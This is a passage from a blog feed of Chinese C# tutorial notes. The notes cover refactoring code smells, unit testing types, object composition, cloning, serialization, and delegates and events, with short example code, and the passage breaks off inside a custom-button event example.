        <content type="html"><![CDATA[<p>问题:<br>    1. 重复代码<br>    2. 过长的函数（过百行的函数需要拆分）=&gt; 把一个大功能分解为几个小功能<br>    3. 乱其名字，无意义<br>    4. 过大的类 =&gt; 每个类应有明确的职责<br>                    =&gt; 处理方式：一个类拆分为多个相互的类；采用继承方法，把一些公有代码移到基类中<br>    5. 过多的参数 =&gt; 改传送参数为传递对象<br>    6. 链式反应<br>        - 一个变化引发多个Class修改：类之间的耦合性太强<br>        - 一个Class受多个外部因素的影响：类实现的功能太多<br>    7. 曝光隐私，滥用public</p><span id="more"></span><pre><code>查看 加密和解密组件（DES,RSA算法完成这些功能）源码，看看设计者如何项使用者隐藏这些算法细节</code></pre><p>处理“神奇数字（magic number）</p><ul><li>使用命名常量来代替具体的数字</li></ul><p>if的判断条件太长</p><ul><li>使用独立返回bool值的函数来代替复杂的逻辑表达式</li></ul><p>嵌套过深的条件语句=&gt;降低嵌套层次</p><p>把逻辑上密切相关的功能代码抽取为独立的函数=&gt;方法抽取</p><h3 id="防卫式编程"><a href="#防卫式编程" class="headerlink" title="防卫式编程"></a>防卫式编程</h3><p>一个函数要想正确运行，一定要有对应的前提条件，因此，在函数开头应当对这些前提条件进行检测</p><p>合并 =&gt; 通过增加参数合并功能类似的代码  =&gt; 何时合并<br>分解 =&gt; 将依赖于参数值采取不同行为的函数分解为几个功能明确的函数 ==&gt; 何时分解<br>使用组合来代替继承</p><h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><ul><li>黑盒</li><li>白盒<br>Arrange =&gt; Act =&gt; Asse t</li></ul><ol><li><p>功能性测试<br>单元测试=&gt;功能测试=&gt;集成测试=&gt;场景测试=&gt;系统测试=&gt;外部软件测试人员</p></li><li><p>非功能性测试<br>压力/负载测试、效能测试、辅助功能测试(向残疾用户提供帮助)、本地化/全球化测试、兼容性测试、配置测试、软件安全性测试</p></li><li><p>其他类型的测试<br>冒烟测试(测试若不通过，则不进行下一步)、构建测试、验收测试(全面)、随机测试、回归测试、找bug、伙伴测试</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0：c#教程-基础</title>
      <link href="/categories/C/%E6%95%99%E7%A8%8B/0%EF%BC%9Ac-%E6%95%99%E7%A8%8B-%E5%9F%BA%E7%A1%80/"/>
      <url>/categories/C/%E6%95%99%E7%A8%8B/0%EF%BC%9Ac-%E6%95%99%E7%A8%8B-%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="2-1-基础"><a href="#2-1-基础" class="headerlink" title="2.1 基础"></a>2.1 基础</h2><h3 id="2-1-1-对象组合"><a href="#2-1-1-对象组合" class="headerlink" title="2.1.1 对象组合"></a>2.1.1 对象组合</h3><p>对象组合：对象合作关系中的一种，其含义是“一个对象包容另一个对象”。<br>“一对一”对象组合的两种类型：</p><span id="more"></span><h4 id="A对象完全包容B对象，生命周期被管理-一T对一、一对多"><a href="#A对象完全包容B对象，生命周期被管理-一T对一、一对多" class="headerlink" title="A对象完全包容B对象，生命周期被管理(一T对一、一对多)"></a>A对象完全包容B对象，生命周期被管理(一T对一、一对多)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//一对一 对象组合方式</span><br><span class="line">Class OneToOneClass&#123;</span><br><span class="line">    private InnerClass obj;</span><br><span class="line">    public OneToOneClass()&#123;</span><br><span class="line">        obj = new InnerClass();  // A对象内部创建B对象</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//一对多 对象组合方式(内部直接new,拥有相同的生命周期，如车的四个轮子)</span><br><span class="line">Class OneToManyClass&#123;</span><br><span class="line">    private List&lt;InnerClass&gt; objs = new List&lt;InnerClass&gt;(); // 内部对象集合</span><br><span class="line"></span><br><span class="line">    public void Add(InnerClass obj)&#123; // 公有方法实现内部集合增删对象</span><br><span class="line">        if(obj != null)&#123;</span><br><span class="line">            objs.Add(obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void Remove()&#123; </span><br><span class="line">        //略</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="B对象是独立的，A对象引用线程的B对象-一对一、一对多"><a href="#B对象是独立的，A对象引用线程的B对象-一对一、一对多" class="headerlink" title="B对象是独立的，A对象引用线程的B对象(一对一、一对多)"></a>B对象是独立的，A对象引用线程的B对象(一对一、一对多)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//一对一 对象组合方式</span><br><span class="line">Class OneToOneClass2&#123;</span><br><span class="line">    private InnerClass obj = null;</span><br><span class="line">    public OneToOneClass2(InnerClass outerObj)&#123;</span><br><span class="line">        this.obj = outerObj;  // 包容的对象由外界负责创建，通常采用对象注入的方式</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//一对多 对象组合方式(对象注入，生命周期相互独立，如飞机场上的飞机)</span><br><span class="line">class OneToManyClass2&lt;T&gt;&#123;</span><br><span class="line">    private IEnumerable&lt;T&gt; objs = null;</span><br><span class="line"></span><br><span class="line">    public OneToManyClass2(IEnumerable&lt;T&gt; objCollections)&#123;</span><br><span class="line">        objs = objCollections;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 一对多，对象注入</span><br><span class="line">List&lt;InnerClass&gt; innerObjs = new List&lt;InnerClass&gt;();</span><br><span class="line">innerObjs.Add(new InnerClass());</span><br><span class="line">  //多创建几个后</span><br><span class="line">OneToManyClass2&lt;InnerClass&gt; outer2 = new OneToManyClass&lt;InnerClass&gt;(innerObjs);</span><br></pre></td></tr></table></figure><h4 id="对象组合实例"><a href="#对象组合实例" class="headerlink" title="对象组合实例"></a>对象组合实例</h4><p>如VS主界面包含诸多控件，就是采用窗体嵌入的方式，分为几块大的容器，然后每个容器可以动态加入新的控件进去。当程序启动时，先显示整个框架，然后在后台线程中构建具体的子界面，等到子界面创建好之后，再嵌入到窗体中。这是一种典型的使用<strong>延时动态组合</strong>的方式。</p><h4 id="对象组合的特殊形式：自引用类"><a href="#对象组合的特殊形式：自引用类" class="headerlink" title="对象组合的特殊形式：自引用类"></a>对象组合的特殊形式：自引用类</h4><p>在没有指针的面向对象编程语言中，自引用类用于<strong>代替指针</strong>建立数据之间的关联。例如通过自引用类实现链表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class MyClass&#123;</span><br><span class="line">    MyClass obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="统一建模语言"><a href="#统一建模语言" class="headerlink" title="统一建模语言"></a>统一建模语言</h3><h3 id="巩固练习：对象组合"><a href="#巩固练习：对象组合" class="headerlink" title="巩固练习：对象组合"></a>巩固练习：对象组合</h3><p>使用自引用类实现下图所示之二叉树，并且对此树进行深度前序遍历（即从根节点出发，先访问根节点，如果有左右节点，先访问左节点，再访问右节点，对每个节点重复此过程）。</p><blockquote><blockquote><blockquote><p>待续；</p></blockquote></blockquote></blockquote><h3 id="2-1-2-对象复制"><a href="#2-1-2-对象复制" class="headerlink" title="2.1.2 对象复制"></a>2.1.2 对象复制</h3><p>需要实现<code>ICloneable</code>接口的<code>Clone</code>方法，层层递进实现深复制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class ClassA: ICloneable&#123;</span><br><span class="line">    public int valA = 100;</span><br><span class="line">    public ClassB EmbedObj; // ClassA 包容一个ClassB的对象，那B对象也需要实现ICloneable接口</span><br><span class="line">    </span><br><span class="line">    //ICloneable的Clone方法</span><br><span class="line">    public Object Clone()&#123;</span><br><span class="line">        ClassA objA = new ClassA();</span><br><span class="line">        objA.valA = this.valA;  // 复制属性</span><br><span class="line">        objA.EmbedObj = (this.EmbedObj as ICloneable).Clone as ClassB; //通过ClassB的Clone方法复制一个B对象成员</span><br><span class="line">        return objA;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-3-对象序列化"><a href="#2-1-3-对象序列化" class="headerlink" title="2.1.3 对象序列化"></a>2.1.3 对象序列化</h3><p>对象序列化主要解决<strong>对象状态</strong>的保存问题。</p><blockquote><blockquote><p>对象状态，其实就是某一时刻对象拥有的各个<strong>字段值的集合</strong>。</p></blockquote></blockquote><ul><li>将<strong>对象状态保存</strong>到另外的一种媒介中，并在需要的时候可以从媒介中重新读取数据<strong>重建对象</strong>的过程称为对象的“序列化”与反序列化。</li><li>在开发中，常用于保存对象状态的媒介：流(Stream) 和 字符串(String)</li></ul><h4 id="流"><a href="#流" class="headerlink" title="流"></a>流</h4><p>流是抽象的概念。代表一连串有顺序的二进制数据。文件流<br><img src="https://tva1.sinaimg.cn/large/005zbIM7ly1gl2y8wgdcvj30ry0amdj0.jpg" alt="image" width="1006" data-width="1006" data-height="382"><br><img src="https://tvax4.sinaimg.cn/large/005zbIM7ly1gl2yanm36vj30i50aymyg.jpg" alt="image" width="653" data-width="653" data-height="394"></p><p>几种流对象：<br><img src="https://tvax4.sinaimg.cn/large/005zbIM7ly1gl2ybygl33j30ph0920vg.jpg" alt="image" width="917" data-width="917" data-height="326"></p><p>对象序列化方式：</p><ul><li>二进制序列化：将对象的数据看成是二进制的数据而直接写入流中。(格式化器：BinaryFormatter)</li><li>XML序列化：将对象数据用MXL方式表示之后再以纯文本的方式写入到流中。(格式化器：SoapFormatter)</li></ul><blockquote><blockquote><blockquote><blockquote><p>待：实例：程序的状态保存；对象的保存；<br>大批的复制对象，深复制的便捷方式。<br>分布式系统的对象序列化<br><img src="https://tvax3.sinaimg.cn/large/005zbIM7ly1gl2yn8z7gbj30tc096425.jpg" alt="image" width="1056" data-width="1056" data-height="330"></p></blockquote></blockquote></blockquote></blockquote><h3 id="2-1-4-对象的比较"><a href="#2-1-4-对象的比较" class="headerlink" title="2.1.4 对象的比较"></a>2.1.4 对象的比较</h3><h3 id="2-1-5-对象间的协作与信息交换-重要"><a href="#2-1-5-对象间的协作与信息交换-重要" class="headerlink" title="2.1.5 对象间的协作与信息交换(重要)"></a>2.1.5 对象间的协作与信息交换(重要)</h3><p>对象协作的本质就是对象间信息交换的问题，体现为对象之间的相互访问，即：</p><ul><li>相互<strong>存取字段/属性</strong></li><li>相互<strong>调用方法</strong></li></ul><h4 id="直接通过类本身的字段和属性来完成"><a href="#直接通过类本身的字段和属性来完成" class="headerlink" title="直接通过类本身的字段和属性来完成"></a>直接通过类本身的字段和属性来完成</h4><h5 id="一对一，主-gt-从-对象间信息传送"><a href="#一对一，主-gt-从-对象间信息传送" class="headerlink" title="一对一，主-&gt;从 对象间信息传送"></a>一对一，主-&gt;从 对象间信息传送</h5><p>主窗体通过<strong>从窗体对象的引用</strong>，调用其公有方法/属性传送信息。</p><h5 id="一对一，从-gt-主-对象信息传送"><a href="#一对一，从-gt-主-对象信息传送" class="headerlink" title="一对一，从-&gt;主 对象信息传送"></a>一对一，从-&gt;主 对象信息传送</h5><p>主、从窗体例子中，实现方法：</p><ul><li>从窗体设置公有方法，主窗体依据从窗体提供的状态信息和返回值，进行处理显示</li><li>从窗体“主动”向主窗体“汇报工作”，这种方法需要用到两个编程技巧：<ol><li>对象注入：从窗体使用this把自己引用传给从窗体</li><li>“回调”：从窗体回调主窗体的共有方法<blockquote><p>回调：一般情况：new一个对象，然后调用它的方法。然而，如果我们（假设为A）new了一个对象B，告诉它在某条件下，可以调用XXX方法，之后不管；等B在合适的时候，自己调用A告诉它的方法，这就叫“回调”。简单来说，这个方法何时被调用不由A做主。</p></blockquote></li></ol></li></ul><h5 id="实践：两个对象间信息的双向传送"><a href="#实践：两个对象间信息的双向传送" class="headerlink" title="实践：两个对象间信息的双向传送"></a>实践：两个对象间信息的双向传送</h5><h5 id="一对多，主-gt-从，对象间的“信息广播”"><a href="#一对多，主-gt-从，对象间的“信息广播”" class="headerlink" title="一对多，主=&gt;从，对象间的“信息广播”"></a>一对多，主=&gt;从，对象间的“信息广播”</h5><ul><li>使用<strong>对象集合</strong>的方法实现“消息广播”：主窗体使用一个对象集合保存所有已创建从窗体对象的<strong>引用</strong>；点击按钮时，<strong>遍历</strong>这个对象集合，逐个调用从窗体对象的<strong>公有方法</strong>显示信息。</li><li>主窗体定义一个<strong>委托</strong>变量，在创建从窗体对象时，将从窗体的<strong>公有方法挂接</strong>到这个字段上；实现一次点击，同时更新显示</li><li>主窗体定义一个MyClick<strong>事件</strong>，当点击按钮时，触发这个事件；从窗体的公有方法ShowCounter()方法<strong>响应</strong>这个事件，当事件触发时，刷新显示。<br>利用委托实现“消息广播”，实现过程：<br>  主窗体定义一个ReceiverMethods委托变量，在创建从窗体对象时，将 从窗体 的共有方法 showCounter 挂接到这个变量上；<br>  主窗体点击按钮时，只需要调用一次ReceiverMethods，所有 从窗体都能更新显示。<br>  本质是主窗体“回调”从窗体的方法。</li></ul><h5 id="一对多，主-lt-从，一个对象“监控”多个对象"><a href="#一对多，主-lt-从，一个对象“监控”多个对象" class="headerlink" title="一对多，主&lt;=从，一个对象“监控”多个对象"></a>一对多，主&lt;=从，一个对象“监控”多个对象</h5><ul><li>利用对象引用回调：从窗体有一个字段引用主窗体对象，当从窗体点击按钮时，它通过对象引用调用主窗体的方法向其“主动汇报情况**</li><li>利用委托回调：主窗体在创建从窗体对象时，把它自己的共有方法ShowCounter<strong>挂接</strong>到主窗体的委托对象上；当从窗体点击按钮时，通过委托回调主窗体的方法</li><li>自定义事件：从窗体定义一个MyClick事件，主窗体的方法中响应这个事件(方法挂接到事件上)，在事件响应代码中累加计数并更新显示。=&gt;一个对象响应多个对象触发的事件。</li><li>全局静态字段和方法，静态计数器，静态主窗体引用，静态方法，从窗体直接调用即可。<strong>不推荐</strong></li></ul><h5 id="多对多-对象间的协作与信息交换"><a href="#多对多-对象间的协作与信息交换" class="headerlink" title="多对多 对象间的协作与信息交换"></a>多对多 对象间的协作与信息交换</h5><p>如果使用“对象之间相互只有对方引用”方式实现对象的通讯，太多太乱了。当添加和移除新对象时，维护成本过高。<br>解决方案：</p><ul><li>该“多对多”为“一对多”：添加一个中介者作为消息交换中心。</li></ul><h2 id="2-2-委托与事件"><a href="#2-2-委托与事件" class="headerlink" title="2.2 委托与事件"></a>2.2 委托与事件</h2><h3 id="2-2-1-委托基础"><a href="#2-2-1-委托基础" class="headerlink" title="2.2.1 委托基础"></a>2.2.1 委托基础</h3><p>委托是事件、异步调用、多线程开发的技术基础。</p><h4 id="定义一个委托"><a href="#定义一个委托" class="headerlink" title="定义一个委托"></a>定义一个委托</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public delegate int MathOptDelegate(int value1,int value2); // 可以接受一个 有两个int参数和int返回值的函数引用</span><br><span class="line">MathOptDelegate oppDel; //定义一个委托变量</span><br><span class="line">MathOpt obj = new MathOpt();  // 类 MathOpt，定义了Add方法(</span><br><span class="line">oppDel = obj.Add;       //委托变量接受一个方法引用</span><br><span class="line">Console.WriteLine(oppDel(1,2));  // 调用</span><br></pre></td></tr></table></figure><h4 id="多路委托，使用-挂接方法，使用-移除方法的引用-组合委托"><a href="#多路委托，使用-挂接方法，使用-移除方法的引用-组合委托" class="headerlink" title="多路委托，使用+=挂接方法，使用-=移除方法的引用; 组合委托"></a>多路委托，使用+=挂接方法，使用-=移除方法的引用; 组合委托</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MyClass obj = new MyClass();</span><br><span class="line">MyDelegate del1 = new MyDelegate(obj.Func1);</span><br><span class="line">del1 += new MyDelegate(obj.Func2); // 挂接方法</span><br><span class="line"></span><br><span class="line">Delegate[] ds = del1.GetInvovationList(); //获取方法调用列表&lt;&lt;&lt;&lt;</span><br><span class="line"></span><br><span class="line">del1(5);  //堆，先进先出，先调用Func1，再调用Func2</span><br><span class="line"></span><br><span class="line">//简写：</span><br><span class="line">MyDelegate del2 = obj.Func1;</span><br><span class="line">obj2 += obj.Func2;</span><br><span class="line"></span><br><span class="line">//组合委托</span><br><span class="line">MyDelegate mu1 = del1 + del2; //此时有包含四个方法引用</span><br><span class="line">mu1(10); //之后返回委托调用列表最后一个方法的返回值</span><br><span class="line">mu1 -= obj.Func2; // 移除最后一个方法引用</span><br><span class="line">//从头开始调用方法，从尾开始查找移除方法的引用</span><br></pre></td></tr></table></figure><h4 id="匿名方法"><a href="#匿名方法" class="headerlink" title="匿名方法"></a>匿名方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public delegate int Del(int i,int j);</span><br><span class="line"></span><br><span class="line">Del del = delegate(int i,int j)&#123;</span><br><span class="line">    return i + j;</span><br><span class="line">&#125;</span><br><span class="line">//或者</span><br><span class="line">Del del = delegate((i,j) =&gt; i+j);</span><br></pre></td></tr></table></figure><h4 id="委托类型直接作为方法形参"><a href="#委托类型直接作为方法形参" class="headerlink" title="委托类型直接作为方法形参"></a>委托类型直接作为方法形参</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public static void invokeDelegate(Del del,int i, int j)&#123; //Del是定义的委托变量，del是一个方法</span><br><span class="line">    Console.WriteLine(del(i,j));</span><br><span class="line">&#125;</span><br><span class="line">//调用</span><br><span class="line">invokeDelegate((i,j)=&gt;i+j,100,200);</span><br></pre></td></tr></table></figure><h4 id="编程中如何应用"><a href="#编程中如何应用" class="headerlink" title="编程中如何应用"></a>编程中如何应用</h4><p>可以引用一个方法调用列表，并且可以随时改变它所引用的方法列表。<br>委托的本质特征是“一对多”，一个委托变量对应多个方法。</p><h4 id="实例：定时回调"><a href="#实例：定时回调" class="headerlink" title="实例：定时回调"></a>实例：定时回调</h4><h3 id="2-2-2-泛型委托，预定义委托"><a href="#2-2-2-泛型委托，预定义委托" class="headerlink" title="2.2.2 泛型委托，预定义委托"></a>2.2.2 泛型委托，预定义委托</h3><ul><li>泛型委托使用与普通委托一样，只是在定义的时候指定泛型参数即可。</li><li>使用<strong>预定义委托</strong>，无需从头定义自己的委托类型。常见的两种： Func&lt;&gt; 和 Action&lt;&gt;<ul><li>Func&lt;&gt;: 最后一个参数是委托所接收方法的返回值，前面参数就是委托所接收方法的形参。</li><li>Action&lt;&gt;: 接收返回void方法的预定义委托</li><li>泛型委托=&gt;泛型委托变量；语法糖：直接使用预定义委托来定义泛型委托变量。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//普通委托</span><br><span class="line">public delegate int Del(int i,int j);</span><br><span class="line">Del del =(i,j) =&gt; i+j;</span><br><span class="line"></span><br><span class="line">//定义泛型委托</span><br><span class="line">public delegate T Del&lt;T&gt;(T obj1,T obj2); //定义指定泛型参数</span><br><span class="line">Del&lt;int&gt; del = (i,j)=&gt;i+j;</span><br><span class="line"></span><br><span class="line">//使用预定义委托 Func&lt;&gt;</span><br><span class="line">Func&lt;int,int,long&gt; del = (i,j) =&gt; i+j; //i和j为int类型，并且返回long类型的值</span><br></pre></td></tr></table></figure><h3 id="2-2-3-委托与事件"><a href="#2-2-3-委托与事件" class="headerlink" title="2.2.3 委托与事件"></a>2.2.3 委托与事件</h3>事件三要素：</li></ul></li><li>事件源，激发事件的对象</li><li>事件信息，事件本身携带的信息</li><li>事件响应者，响应事件的代码，就是当事件发生时，计算机需要完成的工作</li></ul><h4 id="事件驱动"><a href="#事件驱动" class="headerlink" title="事件驱动"></a>事件驱动</h4><p>“事件驱动”的软件<strong>运行</strong>方式：事件触发时，响应事件的代码被调用。<br>例如：事件触发：鼠标移动；事件响应者：输出lblInfo.Text</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private void Form1_MouseMove(object sender, MouseEventArgs e)&#123;</span><br><span class="line">    lblInfo.Text = string.Format(</span><br><span class="line">        &quot;事件信息：(&#123;0&#125;,&#123;1&#125;) \n事件源自：&#123;2&#125;&quot;,</span><br><span class="line">        e.X, e.Y, sender.GetType()</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>“事件驱动”的软件<strong>开发</strong>方式为：</p><ol><li>定义并实现自己的<strong>事件</strong>，或者从系统组件库中选择一种现成的事件；</li><li>为这事件编写<strong>响应代码</strong>。</li></ol><p>如何自定义事件？事件的特征？<br>    主要特点为一对多关联，一个事件源可以有多个响应者。<br> =&gt; 委托也具有一对多关联的特性。</p><h4 id="利用委托实现自定义事件"><a href="#利用委托实现自定义事件" class="headerlink" title="利用委托实现自定义事件"></a>利用委托实现自定义事件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">//定义事件委托</span><br><span class="line">public delegate void MyEventDelegate(int value);</span><br><span class="line"></span><br><span class="line">//事件发布者类(事件源)</span><br><span class="line">public class Publisher&#123;</span><br><span class="line">    //利用多路委托变脸保存多个事件响应者方法引用</span><br><span class="line">    public MyEventDelegate MyEvent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//事件响应者类</span><br><span class="line">public class Subscriber&#123;</span><br><span class="line">    //事件触发时的回调方法</span><br><span class="line">    public void MyMethod(int value)&#123;</span><br><span class="line">        Console.WriteLine(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//-----------------------------------------------------------------</span><br><span class="line">// 模拟</span><br><span class="line">//一个事件源对象</span><br><span class="line">Publisher p = new Publisher();</span><br><span class="line">//两个事件响应者</span><br><span class="line">Subscriber s1 = new Subscriber();</span><br><span class="line">Subscriber s2 = new Subscriber();</span><br><span class="line"></span><br><span class="line">//挂接事件响应方法</span><br><span class="line">p.MyEvent += s1.MyMethod();</span><br><span class="line">p.MyEvent += s2.MyMethod();</span><br><span class="line"></span><br><span class="line">//触发事件</span><br><span class="line">p.MyEvent(10);</span><br></pre></td></tr></table></figure><h4 id="使用关键字event用于自定义事件"><a href="#使用关键字event用于自定义事件" class="headerlink" title="使用关键字event用于自定义事件"></a>使用关键字event用于自定义事件</h4><p>与使用多路委托的实现方法类似，不同之处在于其增添了一个新的特性：<br>    事件只能有事件源对象自己激发，外界无法通过访问委托变量直接激发事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//事件发布者类</span><br><span class="line">pubLic class Publisher&#123;</span><br><span class="line">    public event MyEventDelegate MyEvent; // 多了个event</span><br><span class="line">    </span><br><span class="line">    //激发事件的对象</span><br><span class="line">    public void FireEvent(int EventArgu)&#123; //外界无法直接触发MyEvent事件，所以只能通过共有方法间接触发</span><br><span class="line">        if(MyEvent != null)&#123;</span><br><span class="line">            MyEvent(EventArgu);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//一个事件源，两个事件响应者</span><br><span class="line">//挂接事件响应方法</span><br><span class="line">//都相同，只是不能直接触发： p.MyEvent() ,编译不通过</span><br><span class="line">p.FireEvent(10);</span><br></pre></td></tr></table></figure><h4 id="代码阅读能力训练"><a href="#代码阅读能力训练" class="headerlink" title="代码阅读能力训练"></a>代码阅读能力训练</h4><p>阅读WinForm中Button的源代码，弄清楚它的Click事件是如何触发的。</p><blockquote><p>.Net事件的触发与响应机制是建立在委托之上的。</p></blockquote><h4 id="套路？"><a href="#套路？" class="headerlink" title="套路？"></a>套路？</h4><p>让事件参数从EventArgs类派生，比如定义一个事件参数类MyClickEventArgs，从EventARgs类派生</p><p>实践：自定义按钮，统计点击次数。</p><ol><li>添加自定义按钮 myclick，具体代码在：<a href="">c_sharp_sample_event</a></li><li>使用泛型事件委托(<strong>更合适的做法</strong>)<br>=&gt; 为了简化自定义事件开发，.NET基类库中自定义了一个通用的泛型事件委托。EventHandler<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">//继承 EventArgs类，添加一个属性ClickCount，在构造方法接收点击次数的值</span><br><span class="line">//新建 MyClick 事件，事件参数是上面那个</span><br><span class="line">//重写OnClick方法，在原有功能的基础上(base.OnClick(e))，添加MyClick的判断与响应</span><br><span class="line">public partial class MyCustomButton : Button</span><br><span class="line">&#123;</span><br><span class="line">    public MyCustomButton()</span><br><span class="line">    &#123;</span><br><span class="line">        InitializeComponent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private int ClickCount = 0;</span><br><span class="line">    //实现方法1：先定义委托，再定义事件</span><br><span class="line">    public delegate void MyClickEventDelegate(object sender,MyClickEventArgus eventArgs);</span><br><span class="line">    public event MyClickEventDelegate MyClick; </span><br><span class="line">    //实现方法2：定义泛型事件委托</span><br><span class="line">    //public delegate void EventHandler&lt;TEventArgus&gt;(Object sender, TEventArgus eventArgs) where TEventArgus:EventArgs;</span><br><span class="line">    public EventHandler&lt;MyClickEventArgus&gt; MyClick2;</span><br><span class="line">    protected override void OnClick(EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        base.OnClick(e);</span><br><span class="line">        ClickCount++;</span><br><span class="line">        //实现方法1：</span><br><span class="line">        MyClick?.Invoke(this, new MyClickEventArgus(ClickCount));</span><br><span class="line">        //实现方法2：</span><br><span class="line">        MyClick2?.Invoke(this, new 